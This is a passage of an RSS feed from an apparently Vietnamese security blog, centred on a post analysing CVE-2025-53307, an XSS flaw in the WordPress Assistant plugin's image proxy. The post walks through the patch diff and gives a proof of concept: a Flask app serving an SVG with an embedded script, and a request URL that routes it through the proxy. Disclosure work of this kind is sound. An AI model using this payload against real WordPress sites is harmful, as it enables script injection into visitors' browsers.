1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/authorsy/vulnerability/wordpress-authorsy-plugin-1-0-5-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Authorsy Plugin &amp;lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53307 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-03-cve-2025-53307/</link>
      <pubDate>Fri, 03 Oct 2025 19:19:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-03-cve-2025-53307/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Assistant&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.6.2&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53307&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53307&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/assistant/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Assistant Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Assistant&lt;/strong&gt;:  v1.5.2(vul) v√† v1.5.3(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL &lt;strong&gt;m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type&lt;/strong&gt;. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =&amp;gt; g√¢y ra l·ªó h·ªïng XSS.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff.png&#34;&#xA;    alt=&#34;Diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem &lt;a href=&#34;https://wordpress.org/plugins/assistant/#developers&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;change log&lt;/a&gt; ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Changelog&#xA;1.5.3 ( 2025-09-08 )&#xA;&#xA;- Changes to support the integration of Assistant in Beaver Builder version 2.10&#xA;- Fixed dark mode issues on the Home app and sidebar.&#xA;- Security: Fixed a potential XSS vulnerability in the &amp;#34;image proxy&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ L·ªó h·ªóng n·∫±m trong file &lt;strong&gt;backend/src/Hooks/ImageProxy.php&lt;/strong&gt;, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff1.png&#34;&#xA;    alt=&#34;S·ª± kh√°c bi·ªát trong h√†m render_image c·ªßa ImageProxy.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;S·ª± kh√°c bi·ªát trong h√†m render_image c·ªßa ImageProxy.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;S·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m &lt;code&gt;render_image&lt;/code&gt; v·ªõi ch·ª©c nƒÉng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nh·∫≠n tham s·ªë url t·ª´ query string &lt;code&gt;($_GET[&#39;url&#39;])&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ch·ªëng &lt;strong&gt;ssrf&lt;/strong&gt; b·∫±ng &lt;code&gt;wp_safe_remote_get&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu n·ªôi dung c√≥ header &lt;strong&gt;Content-Type&lt;/strong&gt; b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;image/&lt;/code&gt;, th√¨:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i header &lt;strong&gt;Content-Type&lt;/strong&gt; ƒë√≥ cho client.&lt;/li&gt;&#xA;&lt;li&gt;In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh &lt;strong&gt;kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;SVG c≈©ng c√≥ &lt;strong&gt;Content-Type&lt;/strong&gt; b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;image/&lt;/code&gt; v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong =&amp;gt; XSS c√≥ th·ªÉ x·∫£y ra.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra &lt;strong&gt;MIME type&lt;/strong&gt; th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$filesystem = self::filesystem();&#xA;$tmpfile    = tempnam( &amp;#39;/tmp&amp;#39;, &amp;#39;assistant&amp;#39; );&#xA;$filesystem-&amp;gt;put_contents( $tmpfile, $body );&#xA;$validimage = wp_get_image_mime( $tmpfile );&#xA;$filesystem-&amp;gt;delete( $tmpfile );&#xA;&#xA;if ( ! $validimage ) {&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.2/src/wp-includes/functions.php#L3330-L3417&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_get_image_mime()&lt;/code&gt;&lt;/a&gt; s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá =&amp;gt; return &lt;strong&gt;false&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong &lt;code&gt;__construct&lt;/code&gt; c·ªßa class &lt;code&gt;ImageProxy&lt;/code&gt;, ph∆∞∆°ng th·ª©c &lt;code&gt;render_image()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook &lt;code&gt;&#39;init&#39;&lt;/code&gt;. Hook &lt;code&gt;&#39;init&#39;&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;render_image&lt;/code&gt; ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë &lt;code&gt;$_GET[&#39;fl_asst_image_proxy&#39;]&lt;/code&gt; t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;üëâ Khi truy c·∫≠p &lt;code&gt;/wp-admin/?fl_asst_image_proxy=value1&amp;amp;url=http://yoursite/image-path&lt;/code&gt; th√¨ &lt;code&gt;render_image&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o 1 trang &lt;a href=&#34;https://github.com/w41bu1/w41test&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;web&lt;/a&gt; ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, Response&#xA;&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/&amp;#39;)&#xA;def home():&#xA;    return &amp;#39;Hello, World!&amp;#39;&#xA;&#xA;@app.route(&amp;#39;/svg&amp;#39;)&#xA;def about():&#xA;    svg = &amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;    &amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;        &amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&#xA;    &amp;lt;/svg&amp;gt;&amp;#34;&amp;#34;&amp;#34;&#xA;    return Response(svg, mimetype=&amp;#34;image/svg&amp;#43;xml&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;G·ª≠i request ch·ª©a &lt;strong&gt;url param&lt;/strong&gt; tr·ªè ƒë·∫øn &lt;code&gt;https://yoursite/svg&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/?fl_asst_image_proxy=abc&amp;amp;url=https://yoursite/svg&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ Th√†nh c√¥ng v·ªõi &lt;code&gt;Unauthenticated&lt;/code&gt; v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url =&amp;gt; XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/detect.png&#34;&#xA;    alt=&#34;SVG ch·ª©a XSS payload ƒë∆∞·ª£c hi·ªÉn th·ªã qua image proxy&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;SVG ch·ª©a XSS payload ƒë∆∞·ª£c hi·ªÉn th·ªã qua image proxy&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-53307&lt;/strong&gt; trong plugin WordPress Assistant (&lt;strong&gt;&amp;lt;= v1.5.2&lt;/strong&gt;) cho ph√©p XSS th√¥ng qua &lt;code&gt;render_image()&lt;/code&gt; v√¨ kh√¥ng ki·ªÉm tra &lt;strong&gt;MIME type&lt;/strong&gt; th·ª±c c·ªßa file. B·∫£n v√° &lt;strong&gt;v1.5.3&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch x√°c th·ª±c n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ tr√¨nh duy·ªát.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng tin c·∫≠y v√†o &lt;strong&gt;Content-Type header&lt;/strong&gt; t·ª´ &lt;strong&gt;HTTP response&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c &lt;strong&gt;MIME type&lt;/strong&gt; th·ª±c s·ª± c·ªßa file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/assistant/vulnerability/wordpress-assistant-plugin-1-5-2-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WordPress Assistant Plugin &amp;lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6234 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-02-cve-2025-6234/</link>
      <pubDate>Thu, 02 Oct 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-02-cve-2025-6234/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
